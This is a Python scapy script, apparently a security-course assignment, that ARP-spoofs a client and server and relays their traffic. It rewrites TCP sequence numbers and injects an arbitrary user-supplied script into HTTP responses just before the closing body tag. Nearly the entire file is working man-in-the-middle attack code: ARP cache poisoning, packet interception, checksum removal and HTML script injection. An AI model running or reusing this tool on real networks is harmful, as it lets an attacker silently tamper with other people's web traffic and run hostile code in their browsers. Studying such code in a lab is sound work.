# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
	parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
	parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
	parser.add_argument("-s", "--script", help="script to inject", required=True)
	parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
	return parser.parse_args()


def debug(s):
	global verbosity
	if verbosity >= 1:
		print('#{0}'.format(s))
		sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
	global attackerIP
	result = sr1(ARP(op="who-has", psrc=attackerIP, pdst=IP), verbose=False)
	return result[ARP].hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
	while True:
		spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
		spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
		time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
	debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
	send(ARP(op="is-at", psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac))


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
	debug(f"restoring ARP table for {dstIP}")
	send(ARP(op="is-at", psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC))


# TODO: handle intercepted packets
def interceptor(packet):
	global clientIP, serverIP, attackerMAC
	if packet[Ether].src == attackerMAC:
		return
	
	# Packet is sent to attacker based on MAC dst
	if packet.haslayer(IP) and packet[Ether].dst == attackerMAC:
		# Request from client to server
		if packet[IP].src == clientIP and packet[IP].dst == serverIP:
			cRequestS(packet)
		# Response from server to client
		elif packet[IP].src == serverIP and packet[IP].dst == clientIP:
			sResponseC(packet)


def cRequestS(packet):
	global serverMAC, attackerMAC, portLength, resetPort, clientExpSA, serverExpSA
	
	oriAck = 0
	if packet.haslayer(TCP):
		if packet[TCP].flags != "S":
			tcpLoad = len(packet[TCP]) - packet[TCP].dataofs*4
			if tcpLoad == 0:
				tcpLoad = 1
			if packet[TCP].sport in serverExpSA:
				oriLen = len(serverExpSA[packet[TCP].sport])
				for pair in serverExpSA[packet[TCP].sport]:
					if packet[TCP].seq == pair[0]:
						if packet[TCP].sport in clientExpSA:
							if packet[TCP].flags != "FA":
								for p in reversed(clientExpSA[packet[TCP].sport]):
									if p[0] == packet[TCP].ack and p[1] - packet[TCP].seq == 1:
										p[1] = packet[TCP].seq + tcpLoad
										break
								if packet[TCP].flags == "PA":
									clientExpSA[packet[TCP].sport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
								clientExpSA[packet[TCP].sport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
							else:
								clientExpSA[packet[TCP].sport].clear()
								clientExpSA[packet[TCP].sport] = [[packet[TCP].ack, packet[TCP].seq + tcpLoad]]
							sorted(clientExpSA[packet[TCP].sport],key=lambda l:l[0])
						else:
							clientExpSA[packet[TCP].sport] = [[packet[TCP].ack, packet[TCP].seq + tcpLoad]]
						oriAck = packet[TCP].ack
						packet[TCP].ack = pair[1]
						if packet[TCP].flags == "PA":
							serverExpSA[packet[TCP].sport].clear()
						else:
							serverExpSA[packet[TCP].sport].remove(pair)
						break
				if not len(serverExpSA[packet[TCP].sport]) < oriLen:
					return
		
		if packet[TCP].sport in resetPort:
			if packet[TCP].sport in serverExpSA:
				serverExpSA.pop(packet[TCP].sport)
			if packet[TCP].sport in clientExpSA:
				clientExpSA.pop(packet[TCP].sport)
			if packet[TCP].sport in multiRes:
				multiRes.pop(packet[TCP].sport)
		
		if packet[TCP].flags != "FA":
			debug("# Request")
		else:
			debug("# Finish")
		debug(f"\tflags: {packet[TCP].flags}")
		debug(f"\tsrc: {packet[TCP].sport}")
		debug(f"\tseq: {packet[TCP].seq}")
		debug(f"\told ack: {oriAck}")
		debug(f"\tnew ack: {packet[TCP].ack}")
		if packet[TCP].sport in portLength:
			debug(f"\tportLength {packet[TCP].sport}:{portLength[packet[TCP].sport]}")
		if packet[TCP].sport in multiRes:
			debug(f"\tmultiRes {packet[TCP].sport}:{multiRes[packet[TCP].sport]}")
		if packet[TCP].sport in clientExpSA:
			debug(f"\tclientExpSA {packet[TCP].sport}:{clientExpSA[packet[TCP].sport]}")
		if packet[TCP].sport in serverExpSA:
			debug(f"\tserverExpSA {packet[TCP].sport}:{serverExpSA[packet[TCP].sport]}")
		
		# Delete checksum to make hosts do not check integrity.
		del packet[IP].len
		del packet[IP].chksum
		del packet[TCP].chksum
	
	# Change MAC src and dst, then fragment packets.
	packet[Ether].src = attackerMAC
	packet[Ether].dst = serverMAC
	
	frags = fragment(packet, fragsize = 1000)
	for frag in frags:
		sendp(frag)


def sResponseC(packet):
	global clientMAC, attackerMAC, payload, resetPort, multiRes, clientExpSA, serverExpSA, partPayload
	
	oriSeq = 0
	httpLoad = 0
	oriHttpLen = 0
	# Packet has http load.
	if packet.haslayer(Raw):
		# Add payload.
		httpLoad = packet[Raw].load.decode('utf-8')
		oriHttpLen = len(httpLoad)
		httpLoad = httpLoad.replace('</body>', payload + '</body>')
		
		# Change content length in http header.
		try:
			loadSubString = httpLoad.split()
			index = loadSubString.index('Content-Length:')
			length = int(loadSubString[index+1])
			newLength = length + len(payload)
			lenDiff = len(payload) + len(str(newLength)) - len(str(length))
			httpLoad = httpLoad.replace('Content-Length: ' + str(length), 'Content-Length: ' + str(newLength))
		except:
			pass
		if packet[TCP].dport in partPayload:
			httpLoad = partPayload[packet[TCP].dport] + httpLoad
			partPayload.pop(packet[TCP].dport)
		packet[Raw].load = httpLoad.encode('utf-8')
		tcpLoad = len(packet[TCP]) - packet[TCP].dataofs*4
		if tcpLoad > 1448:
			packet[Raw].load = httpLoad[:-(tcpLoad - 1448)].encode('utf-8')
			partPayload[packet[TCP].dport] = httpLoad[-(tcpLoad - 1448):]
	
	# If TCP flag is FA, raise a flag so that
	# we can close connection when receiving ack from client.
	# Delete checksum to make hosts do not check integrity.
	if packet.haslayer(TCP):
		if packet[TCP].flags == "FA":
			resetPort[packet[TCP].dport] = True
		
		if packet[TCP].flags != "SA":
			if packet.haslayer(Raw):
				tcpLoad = len(packet[TCP]) - packet[TCP].dataofs*4 - len(httpLoad) + oriHttpLen
			else:
				tcpLoad = len(packet[TCP]) - packet[TCP].dataofs*4
			if tcpLoad == 0:
				tcpLoad = 1
			
			if packet[TCP].dport in clientExpSA:
				oriLen = len(clientExpSA[packet[TCP].dport])
				for pair in clientExpSA[packet[TCP].dport]:
					if packet[TCP].ack == pair[1]:
						if packet[TCP].dport in serverExpSA:
							for p in reversed(serverExpSA[packet[TCP].dport]):
								if p[0] == packet[TCP].ack and p[1] - packet[TCP].seq == 1:
									p[1] = packet[TCP].seq + tcpLoad
									break
							if packet[TCP].flags == "PA":
								serverExpSA[packet[TCP].dport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
							serverExpSA[packet[TCP].dport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
							sorted(serverExpSA[packet[TCP].dport],key=lambda l:l[0])
						else:
							serverExpSA[packet[TCP].dport] = [[packet[TCP].ack, packet[TCP].seq + tcpLoad]]
						if packet[TCP].dport not in multiRes:
							multiRes[packet[TCP].dport] = packet[TCP].seq
						oriSeq = packet[TCP].seq
						if packet.haslayer(Raw):
							if (packet[TCP].seq - pair[0]) > (len(httpLoad) - oriHttpLen):
								diff = pair[0] - multiRes[packet[TCP].dport]
								packet[TCP].seq = packet[TCP].seq + diff
							else:
								packet[TCP].seq = pair[0]
						else:
							packet[TCP].seq = pair[0]
						if packet[TCP].flags == "PA":
							clientExpSA[packet[TCP].dport].clear()
							multiRes.pop(packet[TCP].dport)
						else:
							clientExpSA[packet[TCP].dport].remove(pair)
						break
				if not len(clientExpSA[packet[TCP].dport]) < oriLen:
					return
			else:
				if packet[TCP].dport in serverExpSA:
					for p in reversed(serverExpSA[packet[TCP].dport]):
						if p[0] == packet[TCP].ack:
							p[1] = packet[TCP].seq + tcpLoad
							break
					serverExpSA[packet[TCP].dport].append([packet[TCP].ack, packet[TCP].seq + tcpLoad])
					sorted(serverExpSA[packet[TCP].dport],key=lambda l:l[0])
				else:
					serverExpSA[packet[TCP].dport] = [[packet[TCP].ack, packet[TCP].seq + tcpLoad]]
		
		del packet[IP].len
		del packet[IP].chksum
		del packet[TCP].chksum
		debug("# Response")
		debug(f"\tflags: {packet[TCP].flags}")
		debug(f"\tdst: {packet[TCP].dport}")
		debug(f"\told seq: {oriSeq}")
		debug(f"\tnew seq: {packet[TCP].seq}")
		debug(f"\tack: {packet[TCP].ack}")
	if packet[TCP].dport in portLength:
		debug(f"\tportLength {packet[TCP].dport}:{portLength[packet[TCP].dport]}")
	if packet[TCP].dport in multiRes:
		debug(f"\tmultiRes {packet[TCP].dport}:{multiRes[packet[TCP].dport]}")
	if packet[TCP].dport in clientExpSA:
		debug(f"\tclientExpSA {packet[TCP].dport}:{clientExpSA[packet[TCP].dport]}")
	if packet[TCP].dport in serverExpSA:
		debug(f"\tserverExpSA {packet[TCP].dport}:{serverExpSA[packet[TCP].dport]}")
	
	# Change MAC src and dst, then fragment packets.
	packet[Ether].src = attackerMAC
	packet[Ether].dst = clientMAC
	
	frags = fragment(packet, fragsize = 1000)
	for frag in frags:
		sendp(frag)


if __name__ == "__main__":
	args = parse_arguments()
	verbosity = args.verbosity
	if verbosity < 2:
		conf.verb = 0 # minimize scapy verbosity
	conf.iface = args.interface # set default interface

	clientIP = args.clientIP
	serverIP = args.serverIP
	attackerIP = get_if_addr(args.interface)
	script = args.script
	if script is None:
		script = 'alert("Successful Injection!")'
	payload = '<script>' + script + '</script>'

	clientMAC = mac(clientIP)
	serverMAC = mac(serverIP)
	attackerMAC = get_if_hwaddr(args.interface)
	
	# dictionary of {port: [1st lenDiff, 2nd lenDiff, ...], ...}
	portLength = {}
	
	# dictionary of {port: True, ...}
	# Raise a flag for closing connection.
	resetPort = {}
	
	# dictionary of {port: seq number, ...}
	# Store seq of first segment from response.
	multiRes = {}
	
	clientExpSA = {}
	serverExpSA = {}
	partPayload = {}

	# start a new thread to ARP spoof in a loop
	spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
	spoof_th.start()

	# start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
	sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
	sniff_th.start()

	try:
		while True:
			pass
	except KeyboardInterrupt:
		restore(clientIP, clientMAC, serverIP, serverMAC)
		restore(serverIP, serverMAC, clientIP, clientMAC)
		sys.exit(1)

	restore(clientIP, clientMAC, serverIP, serverMAC)
	restore(serverIP, serverMAC, clientIP, clientMAC)
